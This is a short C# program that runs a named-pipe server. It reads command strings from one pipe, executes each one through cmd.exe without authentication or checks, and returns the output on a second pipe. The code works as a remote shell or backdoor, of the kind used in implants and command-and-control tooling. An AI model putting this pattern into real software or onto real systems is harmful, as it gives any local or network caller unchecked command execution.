using System;
using System.Diagnostics;
using System.IO.Pipes;
using System.Text;
using System.Net;
using System.Runtime.InteropServices;

class Pipe
{
    static void Main(string[] args)
    {

        var input_namedpipe = new NamedPipeServerStream("inpipe", PipeDirection.InOut);
        var output_namedpipe = new NamedPipeServerStream("outpipe", PipeDirection.InOut);

        Console.WriteLine("Pipe Server has been created, waiting for a dream .");

        while (true)
        {
            if (!input_namedpipe.IsConnected)
            {
                Console.WriteLine("Waiting for client connection...");
                input_namedpipe.WaitForConnection();
                Console.WriteLine("Client connected to input namepipe.");
            }

            if (!output_namedpipe.IsConnected)
            {
                Console.WriteLine("Waiting for client connection...");
                output_namedpipe.WaitForConnection();
                Console.WriteLine("Client connected to output namepipe.");
            }

            byte[] buffer = new byte[4096];
            int bytesRead = input_namedpipe.Read(buffer, 0, buffer.Length);
            string command = Encoding.ASCII.GetString(buffer, 0, bytesRead);
            Console.WriteLine($"Received command: {command}");


            try
            {
                Process process = new Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.Arguments = "/c " + command;
                process.StartInfo.RedirectStandardOutput = true;
                process.StartInfo.UseShellExecute = false;
                process.Start();

                string output = process.StandardOutput.ReadToEnd();
                process.WaitForExit();

                if (process.ExitCode != 0)
                {
                    throw new Exception($"Command failed with exit code {process.ExitCode}");
                }
                output = output.Trim();
                byte[] outputBuffer = Encoding.ASCII.GetBytes(output);
                output_namedpipe.Write(outputBuffer, 0, outputBuffer.Length);

            }

            catch (Exception ex)
            {
                Console.WriteLine($"Error executing command: {ex.Message}");
                output_namedpipe.WriteByte(0);
            }

        }
    }
}